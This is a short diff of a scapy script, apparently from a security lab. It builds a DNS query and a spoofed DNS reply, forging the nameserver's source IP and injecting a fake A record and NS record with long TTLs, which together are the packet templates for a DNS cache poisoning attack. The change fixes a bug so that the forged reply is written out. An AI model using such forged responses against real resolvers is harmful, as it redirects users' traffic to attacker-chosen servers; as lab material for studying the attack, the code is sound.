@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 from scapy.all import * 
 import random, string
 
@@ -22,7 +21,7 @@ request = ip/udp/dns
 with open('ip_req.bin', 'wb') as f:
     f.write(bytes(request))
 
-# ansers
+# answers
 Qdsec = DNSQR(qname=name)
 Anssec = DNSRR(rrname=name, type='A', rdata="1.2.3.5", ttl=259200)
 NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
@@ -32,4 +31,4 @@ ip = IP(dst=apoloIP, src=nsIPs[0])
 udp = UDP(dport=33333, sport=53, chksum=0)
 reply = ip/udp/dns
 with open('ip_resp.bin', 'wb') as f:
-    f.write(bytes(request))
+    f.write(bytes(reply))
